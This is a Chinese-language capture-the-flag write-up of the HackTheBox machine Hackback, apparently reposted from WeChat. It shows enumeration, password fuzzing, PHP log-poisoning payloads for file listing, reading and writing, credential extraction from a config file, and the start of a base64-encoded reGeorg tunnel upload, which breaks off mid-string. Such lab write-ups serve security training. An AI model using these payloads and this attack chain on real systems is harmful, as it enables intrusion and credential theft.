> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/I1KuBEqBf5mhFW7q0Q7Q7A)

Hackback 是一个非常难的靶机，其中涉及了钓鱼网站、参数模糊测试、日志中毒、HTTP 代理、WinRm 服务、UserLogger 服务、NFTS 数据流、恶意 dll 等知识，总共耗费了我五天时间来攻克和研究，感兴趣的同学可以在 HackTheBox 中进行学习。我觉得主要难的还是日志相关的那两个点，这是不是和近期 log4j2 远程代码执行有异曲同工之妙呢？让我们一起来看看

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf63SUmU9xvqee8b2TI0pia6ECvLmtRytRMDDibFwSS97X4y4ZWRbB6iasw/640?wx_fmt=png)

0x01 侦查
-------

### 端口探测

首先通过 nmap 对目标进行端口扫描

```
nmap -Pn -p- -sV -sC -A 10.10.10.128 -oA nmap_Hackback
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaflabEc5ibQwgq6tKicQu6sYXU17A33IrmRibw38xb6yNgZM541oD8XibFUA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafG94KdqqR7qk0JUyNf86JrG2UThjOibVE5pPxVjDmuU0nfDkz3Kxkh4Q/640?wx_fmt=png)发现目标开放了 80、6666、64381 端口

#### 80 端口

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafZRGR4U4s6EiaLmZ3ZibW8ltm9jCibBPnt4pjibWbhiaeKMrGbnGUbRVVm8A/640?wx_fmt=png)网站元素查看可以发现该站点采用 ASP.NET![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafaLCbkOZ4euiaIibTq7FJrWWjRsGKUibx04ibjSdqvhvO9IxDDJRhbEKquw/640?wx_fmt=png)

#### 6666 端口

```
curl http://10.10.10.128:6666
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaft8Lvb6u3VnDaAdQ0j5m06ufEkcgFM1WIESmhjcj1Cz66sSlWbVcRXg/640?wx_fmt=png)提示说缺少命令，尝试通过 wfuzz 来对正确的路径进行模糊测试

```
wfuzz -c -w /usr/share/wordlists/SecLists/Discovery/Web-Content/burp-parameter-names.txt --hc 404 http://10.10.10.128:6666/FUZZ
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafZG93VGZiauQKRWYGtHXycpibbYRTXNciaFicj1u7K6nayqskb5OnMywFbQ/640?wx_fmt=png)发现了一些路径，首先探测 help

```
curl http://10.10.10.128:6666/help
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaflMUibkXDXxNSVA3GlqHup7paF9LpK5k5X8ZaMjrLGS0pwibjkvuEshcQ/640?wx_fmt=png)在 help 中列出了全部参数，那么接下来测试这些路径

```
curl http://10.10.10.128:6666/hello
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafqrAXMjoaNFm4uZv1dlJaxNbKYYwfZOkOCzZviaY4l6w6djBOQ9LnRwA/640?wx_fmt=png)

```
curl http://10.10.10.128:6666/proc | jq -c .[]
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafDk7SbjwZicsT4sS2jyqJjEmzTy6u8O9IOLZpwcNNnP7eWKuGpxPKrcw/640?wx_fmt=png)

```
curl http://10.10.10.128:6666/whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafMgSh2VSQOHoKPFEh4my4V0eyXiaDpzgn0EFibUpyTjlYjdsycHr9x9mQ/640?wx_fmt=png)

```
curl http://10.10.10.128:6666/list | jq -c .[]
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafzl6jvczWRiceKCqgVs9J8ibic4bkkl3ehflL2YcO9TtI4JzFhic9icYQkTw/640?wx_fmt=png)

```
curl http://10.10.10.128:6666/services | jq -c .[]
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafr6vygYG38cBbkw8vGeZVVQ6ibo7xE8yP7YLuQWho9z53vaKrDuFq34g/640?wx_fmt=png)

```
curl -s http://10.10.10.128:6666/netstat | jq -r '.[] | select(.State=2) | "\(.LocalAddress):\(.LocalPort) [\(.OwningProcess)]"' | sed 's/::/0.0.0.0/g' | sort -n -t':' -k2
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafTs7OEPBKWcLiaZnJoHVpSJHmUe5q9OsUM6xzHfiaKYicMmedAtCaJghGw/640?wx_fmt=png)经过整理可以看到 hello 返回一条打招呼信息；proc 返回进程列表；whoami 返回当前用户具体信息；list 返回网站目录当中的内容；services 返回服务信息；netstat 返回端口连接情况，相比 nmap 探测的要多。

#### 64831 端口

是一个 GoPhish 登录界面![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafKJmzpXJa1xAG9Qibo6bVniaMzqXQEw5Nozszicjx0lZUBcWxLJH1IZ1wg/640?wx_fmt=png)通过默认账号密码 admin/gophish 进入![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafm3TCDA5aqDl4mZVsicvbUfRtib3iaDYEZznVBTUnOEuNLPtSttOKAEdfw/640?wx_fmt=png)在电子邮件模块下存在五个模块，分别是 Admin、Fackbook、HackTheBox、Paypal、Twitter![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafFd4GQ0Xrc7blLqiafD4jZkDeXEoStO3OdIsiaN1GqB8NFvibyKJTnkb3g/640?wx_fmt=png) 点击 Admin 模块，切换到 html 格式，可以发现存在一个域名![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafOQ9NdgqyfNgkZx2aCBuHjW9ucPcicAbSicbB3xiadcggB2ueBicUqWEPjw/640?wx_fmt=png)点开其他的模块也可以发现不同的域名，经过整理后如下

```
admin.hackback.htbwww.facebook.htbwww.hackthebox.htbwww.paypal.htbwww.twitter.htb
```

将它们添加到 hosts 文件中配置 DNS

```
vim /etc/hosts##配置10.10.10.128 admin.hackback.htb www.hackthebox.htb www.twitter.htb www.paypal.htb www.facebook.htb
```

### 钓鱼网站

设置完成后分别访问四个域![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafUABPyNRbibicSp3etVLMd1fujeb3mMCKzQserDWCAuqiavPhxxM3ZHdNg/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf4ufztibF6vGgL8wCCI7PHte5ncRFiagoQWQPxSSqcNq1ibU2Kf7Fq3UTw/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafUoAicaiaGibUVHyr0c9V726LOFuc0kufZ0kfQDppL5sWtZeUcgv0G4dsA/640?wx_fmt=png)![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf0ebpwZ5MeehY4KNjICgtGKjX2EmH9IY5be6TLdxjYQQkO1Jibz66tHQ/640?wx_fmt=png)发现这些站点都是著名网站的登录界面，它们主要用于骗取受害人的登录信息，具体手法是通过发送包含钓鱼网站的电子邮件，受害者打开邮件访问这些站点输入账号密码后，就会被黑客获取到账号信息。查看数据包发现这些站点基于 PHP 和 ASP.NET![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafNzKRWLXiaRQCZhrfKo8u4hI38g9vFQQue0IHQ2G2sibPLBUU21eTmibng/640?wx_fmt=png)

### 管理员登录界面

admin.hackback.htb 是一个不同于钓鱼网站的登录界面，查看页面源代码![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafIfrTHmmT606qogibdqweRG7jg4lvhFQHfnrs98NYTficSRomicvKKPPcA/640?wx_fmt=png)其中存在一个提示`<script src="js/.js"></script>`，但是访问 js 目录显示 403，通过 gobuster 扫描 js 目录

```
gobuster dir -u http://admin.hackback.htb/js/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x js -t 50
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafIctFpAHLZeyEnsA3o1yvsUmhIHibRKC6qghDMGVTSBbBkDZDSycjPKA/640?wx_fmt=png)查看`private.js`发现如下内容![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafPf2ibibiaDdGk4DeYYOfIoriaZthYf7rnc88LjzscLcO75VJgiaH1WlHT6Q/640?wx_fmt=png)一般在 js 中使用 var 来定义字符串，而这个 js 择使用 ine 来定义字符串，猜测可能是经过 rot13 编码后的 js 代码

```
curl http://admin.hackback.htb/js/private.js | tr 'a-zA-Z' 'n-za-mN-ZA-M'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaftNkloz30sacOR8GkNsFSTBHdzUIquMTCbIL4tg4S9hTg6egPG7cQMg/640?wx_fmt=png)

放入`beautifier.io`中进行美化，获得如下 js 代码

```
var a = ['\x57\x78\x49\x6a\x77\x72\x37\x44\x75\x73\x4f\x38\x47\x73\x4b\x76\x52\x77\x42\x2b\x77\x71\x33\x44\x75\x4d\x4b\x72\x77\x72\x4c\x44\x67\x63\x4f\x69\x77\x72\x59\x31\x4b\x45\x45\x67\x47\x38\x4b\x43\x77\x71\x37\x44\x6c\x38\x4b\x33', '\x41\x63\x4f\x4d\x77\x71\x76\x44\x71\x51\x67\x43\x77\x34\x2f\x43\x74\x32\x6e\x44\x74\x4d\x4b\x68\x5a\x63\x4b\x44\x77\x71\x54\x43\x70\x54\x73\x79\x77\x37\x6e\x43\x68\x73\x4f\x51\x58\x4d\x4f\x35\x57\x38\x4b\x70\x44\x73\x4f\x74\x4e\x43\x44\x44\x76\x41\x6a\x43\x67\x79\x6b\x3d', '\x77\x35\x48\x44\x72\x38\x4f\x37\x64\x44\x52\x6d\x4d\x4d\x4b\x4a\x77\x34\x6a\x44\x6c\x56\x52\x6e\x77\x72\x74\x37\x77\x37\x73\x30\x77\x6f\x31\x61\x77\x37\x73\x41\x51\x73\x4b\x73\x66\x73\x4f\x45\x77\x34\x58\x44\x73\x52\x6a\x43\x6c\x4d\x4f\x77\x46\x7a\x72\x43\x6d\x7a\x70\x76\x43\x41\x6a\x43\x75\x42\x7a\x44\x73\x73\x4b\x39\x46\x38\x4f\x34\x77\x71\x5a\x6e\x57\x73\x4b\x68'];(function(c, d) {    var e = function(f) {        while (--f) {            c['push'](c['shift']());        }    };    e(++d);}(a, 0x66));var b = function(c, d) {    c = c - 0x0;    var e = a[c];    if (b['MsULmv'] === undefined) {        (function() {            var f;            try {                var g = Function('return\x20(function()\x20' + '{}.constructor(\x22return\x20this\x22)(\x20)' + ');');                f = g();            } catch (h) {                f = window;            }            var i = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';            f['atob'] || (f['atob'] = function(j) {                var k = String(j)['replace'](/=+$/, '');                for (var l = 0x0, m, n, o = 0x0, p = ''; n = k['charAt'](o++); ~n && (m = l % 0x4 ? m * 0x40 + n : n, l++ % 0x4) ? p += String['fromCharCode'](0xff & m >> (-0x2 * l & 0x6)) : 0x0) {                    n = i['indexOf'](n);                }                return p;            });        }());        var q = function(r, d) {            var t = [],                u = 0x0,                v, w = '',                x = '';            r = atob(r);            for (var y = 0x0, z = r['length']; y < z; y++) {                x += '%' + ('00' + r['charCodeAt'](y)['toString'](0x10))['slice'](-0x2);            }            r = decodeURIComponent(x);            for (var A = 0x0; A < 0x100; A++) {                t[A] = A;            }            for (A = 0x0; A < 0x100; A++) {                u = (u + t[A] + d['charCodeAt'](A % d['length'])) % 0x100;                v = t[A];                t[A] = t[u];                t[u] = v;            }            A = 0x0;            u = 0x0;            for (var B = 0x0; B < r['length']; B++) {                A = (A + 0x1) % 0x100;                u = (u + t[A]) % 0x100;                v = t[A];                t[A] = t[u];                t[u] = v;                w += String['fromCharCode'](r['charCodeAt'](B) ^ t[(t[A] + t[u]) % 0x100]);            }            return w;        };        b['OoACcd'] = q;        b['qSLwGk'] = {};        b['MsULmv'] = !![];    }    var C = b['qSLwGk'][c];    if (C === undefined) {        if (b['pIjlQB'] === undefined) {            b['pIjlQB'] = !![];        }        e = b['OoACcd'](e, d);        b['qSLwGk'][c] = e;    } else {        e = C;    }    return e;};var x = '\x53\x65\x63\x75\x72\x65\x20\x4c\x6f\x67\x69\x6e\x20\x42\x79\x70\x61\x73\x73';var z = b('0x0', '\x50\x5d\x53\x36');var h = b('0x1', '\x72\x37\x54\x59');var y = b('0x2', '\x44\x41\x71\x67');var t = '\x3f\x61\x63\x74\x69\x6f\x6e\x3d\x28\x73\x68\x6f\x77\x2c\x6c\x69\x73\x74\x2c\x65\x78\x65\x63\x2c\x69\x6e\x69\x74\x29';var s = '\x26\x73\x69\x74\x65\x3d\x28\x74\x77\x69\x74\x74\x65\x72\x2c\x70\x61\x79\x70\x61\x6c\x2c\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2c\x68\x61\x63\x6b\x74\x68\x65\x62\x6f\x78\x29';var i = '\x26\x70\x61\x73\x73\x77\x6f\x72\x64\x3d\x2a\x2a\x2a\x2a\x2a\x2a\x2a\x2a';var k = '\x26\x73\x65\x73\x73\x69\x6f\x6e\x3d';var w = '\x4e\x6f\x74\x68\x69\x6e\x67\x20\x6d\x6f\x72\x65\x20\x74\x6f\x20\x73\x61\x79';
```

这段代码将 a 设置为三个二进制 blob 的数组，使用 0x66 运行一个函数，定义函数 b 用于解码。将其放入本地 js 运行，也可在`tio.run`站点运行

```
js 
> var ...
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafV4zxKFrECPkA0CVnB6ntZvg9WRmKn1JQLvKzrm04DB1sOsibSw23V9Q/640?wx_fmt=png)根据提示访问`2bb6916122f1da34dcd916421e531578`目录，直接访问会重定向回主目录。在该目录下访问其他路径会提示 404，说明可能存在其他文件，在其中进行目录扫描

```
gobuster dir -u http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/ -w /usr/share/wordlists/dirb/big.txt -xphp -t 50
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafDxrG23GicW75SVqbPUprZoybhwUicqJ0TQibCVrvYek14pEGGc49xVwng/640?wx_fmt=png)发现 webadmin.php，之后开始对参数进行构造，发现 acton=list 下会有回显密码错误

```
curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=test&session='
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafMuibDy7ToYxogib5ewRp2R5Jc5zktNX5yRiayibiazQHXFRXesjaHOibntIg/640?wx_fmt=png)使用 wfuzz 对密码进行模糊测试

```
wfuzz -c -w /usr/share/wordlists/SecLists/Passwords/darkweb2017-top1000.txt --hw 0 --hh 17 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=FUZZ&session='
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafXhjDByMHSxOZTib11VT8FFVlYk4hLORVHB5BRzHV7DZa2T4bUFb2cdA/640?wx_fmt=png)发现密码为 12345678，使用该密码查看返回信息

```
curl 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=list&site=hackthebox&password=12345678&session='
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafgC2fzINibmybdII06QC5iaAtkqhVGic7DWHwCFJsZfXMw6dMfK0Ay5cZg/640?wx_fmt=png)成功返回日志，但是这是哪个站点的日志呢？经过测试后发现登录 hackthebox 后会出现一个新的日志，其中 sessionid 就是我的内网地址![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafSewPaNSoJg1ZhqL9S4ibzRc2SPtWRwqP3dPgK2QUF9Bu5oIMibNe5fag/640?wx_fmt=png)将日志名设置为该 seesionid 同时修改 action 为 show 后可以获取日志内容

```
curl -b "PHPSESSIONID=3c4b5b07fe829951a788d023036262fb6f49340d22959897bd937d096bc8183d" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=3c4b5b07fe829951a788d023036262fb6f49340d22959897bd937d096bc8183d'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafC9SSMKO1zkr3vxR4d0vZFB27R2hDCA7aKia8KTxsW3FEGdW8uZolhqQ/640?wx_fmt=png)

0x02 上线 [simple]
----------------

### php 日志中毒

虽然无法知道知道它的真实路径，但是可以将 php 代码写入日志文件后查看。使用 BurpSuite 抓取 admin.hackthebox.htb 的登录数据包并修改用户名为 php 代码，将其作为代码执行点![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafJWMk8LibI4VD8icnYH3tFC7dmsjnDLx0DEfyXEoJjONInic1mGsyB6Ayw/640?wx_fmt=png)查询日志记录

```
curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafCuRNnCxdG0ib2DtMKXLfxCeiaP6uRlYta0f2ZpsL2wfvRLtEKN1sicZmA/640?wx_fmt=png)发现 php 代码成功执行，那么我们开始执行 whoami![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafibpwHgzA7yyNkiaKtDlDUtET662s95l9L1QlNL6iaxwBIz2GThkJKPcIw/640?wx_fmt=png) 返回一个逗号说明 whoami 命令没起作用![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf23lTAREYLDdZpywMFLicQpzp80vBCZQCzicvFx5eVaXtDsL707bxx9Kw/640?wx_fmt=png) php 可以列出和读取文件都是在 list 和 show 操作中完成的，在创建这些日志文件时也在写入文件。那么可以在执行点中通过函数 scandir 和 print_r 列出目录并打印结果

```
<?php echo print_r(scandir($_GET['dir']));?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafVAndPHcLOYj0FaXElSCiaibxGbL2tqMq8mTqw0HTwOPs8VGl1emM5N4Q/640?wx_fmt=png)在执行点中通过参数 show 传递 dir 命令

```
curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafuevuIAchUy2QxtswlicJ8jWV3oZQlbtMjxMUibBiaNMoswt6bebzZYGOQ/640?wx_fmt=png)成功返回当前目录文件名，在执行点中写入`<?php include($_GET['file']);?>`尝试进行文件读取![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafHP8iak0v7EJM2Dzuwic8O8FeniaEFM2RlDvhscvaHVJMYSzQg6VS4FLLQ/640?wx_fmt=png)

```
curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.&file=index.html'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf4IsfHIOb5y8wzr9zekzvevva6TRbn5rujlg9VX2IWU4J6xA6YdqF0w/640?wx_fmt=png)成功返回 index.html 内容。为了防止乱码，在执行点中尝试通过 php 过滤器经过 base64 编码来读取 php 文件

```
curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.&file=php://filter/convert.base64-encode/resource=webadmin.php'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafT8bibl0Uv7FPkyxcOpoFkpIWyibfvyb285797c8468wpouKjq2NlPbFA/640?wx_fmt=png)成功返回，将内容进行 base64 解码即可

```
cat webadmin.php.bs64 | base64 -d
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaficBmxicibDcmkthOle3jXkgXZhDeH2GdPooDOiciaQBjS8oXWd3WNg5CRmA/640?wx_fmt=png)既然可以读取文件，那么可以尝试写入文件，通过 file_out_contents 在目标上写入文件，先尝试获取一个 base64 编码

```
echo "mac is good" | base64 -w0
```

在执行点中将内容写入日志中完成命令执行

```
<?php $f="bWFjIGlzIGdvb2QK";file_put_contents("mac.txt",base64_decode($f));?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafBVy8opH45ia7pUpzkNxw1TJqX2miaTGm40JACEiaHaYEFFLJayQpvHgQA/640?wx_fmt=png)查看当前目录，发现 mac.txt 已经写入，需要注意的是以下命令得执行两次才能看到写入的文件

```
curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=.'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafYSV17spjMiaHJhwTk2JpaibdI8TveTpFa02bNRhxWsNh6kWrsEOCMO7Q/640?wx_fmt=png)访问文件地址查看 mac.txt 文件内容

```
curl http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/mac.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafjhHnj8P31KEwgsaA3HXsPpIKOiaSY26S6tyicjJKrf9PKpcicj4PHFOAw/640?wx_fmt=png)到目前为止，我们知道该执行点可以列出文件、查看文件以及写入文件。接下来在执行点中写入代码查看上层目录

```
<?php print_r(scandir('..'));?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf2ypPy7VF5xbfnFOacvuXia5ib1YQvgILFiawg3Uvj38PAJ4nlwl1baxEw/640?wx_fmt=png)查看上层文件路径

```
curl -b "PHPSESSIONID=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7" 'http://admin.hackback.htb/2bb6916122f1da34dcd916421e531578/webadmin.php?action=show&site=hackthebox&password=12345678&session=8870c91857abf06f5f0fe0d9acea7f53d846be75c18ab95a0018a32a6b5518f7&dir=..'
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iaf6KdQbnyZAGtZSgylZ02MqfDbLHDd2B3YibLI10jCbWYFdzqTEcqOoRQ/640?wx_fmt=png)发现 web.config 以及 web.config.old，那么继续在执行点中写入 PHP 代码查看它们的内容

```
<?php echo file_get_contents('../web.config');?><?php echo file_get_contents('../web.config.old');?>
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafEHDicAG5XU0mTfOZfjDJOVwjWiaEVBdkGIPCwvbDG4WYZygJAIN9ibPdg/640?wx_fmt=png)在 web.config.old 中发现存在 windows 用户账号密码![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafTRhu3u3icM7XTtqgrPbQULJDPtSD09qcaKg2Oib61sgTqWYXJ0nK1fvg/640?wx_fmt=png)

### 借助代理完成 WinRM 上线

在之前的信息收集我们知道 6666 端口监听的是 winRM 服务，该站点上可以运行 ASP.NET 以及 php，但是在 php 中存在被阻止函数，所以我们尝试使用 ASP.NET 类型的代理，那么开始上传 regeorg 代理

_**工具地址：https://github.com/sensepost/reGeorg**_

首先将 tunnel.aspx 转换为 base64 编码

```
cat tunnel.aspx | base64 -w0
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTpnNfY1iaHLZoG8L4RALib5iafYNQgTQxWKM5vUUHhDt6PZGSO63CWBOGGC4vcc6WRAdoUPb3HFGTIdg/640?wx_fmt=png)上传该 base64 编码并通过 base64_decode() 解码

```
<?php $f="77u/PCVAIFBhZ2UgTGFuZ3VhZ2U9IkMjIiBFbmFibGVTZXNzaW9uU3RhdGU9IlRydWUiJT4NCjwlQCBJbXBvcnQgTmFtZXNwYWNlPSJTeXN0ZW0uTmV0IiAlPg0KPCVAIEltcG9ydCBOYW1lc3BhY2U9IlN5c3RlbS5OZXQuU29ja2V0cyIgJT4NCjwlDQovKiAgICAgICAgICAgICAgICAgICBfX19fXyAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA0KICBfX19fXyAgIF9fX19fXyAgX198X19fICB8X18gIF9fX19fXyAgX19fX18gIF9fX19fICAgX19fX19fICANCiB8ICAgICB8IHwgICBfX198fCAgIF9fX3wgICAgfHwgICBfX198LyAgICAgXHwgICAgIHwgfCAgIF9fX3wgDQogfCAgICAgXCB8ICAgX19ffHwgICB8ICB8ICAgIHx8ICAgX19ffHwgICAgIHx8ICAgICBcIHwgICB8ICB8IA0KIHxfX3xcX19cfF9fX19fX3x8X19fX19ffCAgX198fF9fX19fX3xcX19fX18vfF9ffFxfX1x8X19fX19ffCANCiAgICAgICAgICAgICAgICAgICAgfF9fX19ffA0KICAgICAgICAgICAgICAgICAgICAuLi4gZXZlcnkgb2ZmaWNlIG5lZWRzIGEgdG9vbCBsaWtlIEdlb3JnDQogICAgICAgICAgICAgICAgICAgIA0KICB3aWxsZW1Ac2Vuc2Vwb3N0LmNvbSAvIEBfd19tX18NCiAgc2FtQHNlbnNlcG9zdC5jb20gLyBAdHJvd2FsdHMNCiAgZXRpZW5uZUBzZW5zZXBvc3QuY29tIC8gQGthbXBfc3RhYWxkcmFhZA0KDQpMZWdhbCBEaXNjbGFpbWVyDQpVc2FnZSBvZiByZUdlb3JnIGZvciBhdHRhY2tpbmcgbmV0d29ya3Mgd2l0aG91dCBjb25zZW50DQpjYW4gYmUgY29uc2lkZXJlZCBhcyBpbGxlZ2FsIGFjdGl2aXR5LiBUaGUgYXV0aG9ycyBvZg0KcmVHZW9yZyBhc3N1bWUgbm8gbGlhYmlsaXR5IG9yIHJlc3BvbnNpYmlsaXR5IGZvciBhbnkNCm1pc3VzZSBvciBkYW1hZ2UgY2F1c2VkIGJ5IHRoaXMgcHJvZ3JhbS4NCg0KSWYgeW91IGZpbmQgcmVHZW9yZ2Ugb24gb25lIG9mIHlvdXIgc2VydmVycyB5b3Ugc2hvdWxkDQpjb25zaWRlciB0aGUgc2VydmVyIGNvbXByb21pc2VkIGFuZCBsaWtlbHkgZnVydGhlciBjb21wcm9taXNlDQp0byBleGlzdCB3aXRoaW4geW91ciBpbnRlcm5hbCBuZXR3b3JrLg0KDQpGb3IgbW9yZSBpbmZvcm1hdGlvbiwgc2VlOg0KaHR0cHM6Ly9naXRodWIuY29tL3NlbnNlcG9zdC9yZUdlb3JnDQoqLw0KICAgIHRyeQ0KICAgIHsNCiAgICAgICAgaWYgKFJlcXVlc3QuSHR0cE1ldGhvZCA9PSAiUE9TVCIpDQogICAgICAgIHsNCiAgICAgICAgICAgIC8vU3RyaW5nIGNtZCA9IFJlcXVlc3QuSGVhZGVycy5HZXQoIlgtQ01EIik7DQogICAgICAgICAgICBTdHJpbmcgY21kID0gUmVxdWVzdC5RdWVyeVN0cmluZy5HZXQoImNtZCIpLlRvVXBwZXIoKTsNCiAgICAgICAgICAgIGlmIChjbWQgPT0gIkNPTk5FQ1QiKQ0KICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgIHRyeQ0KICAgICAgICAgICAgICAgI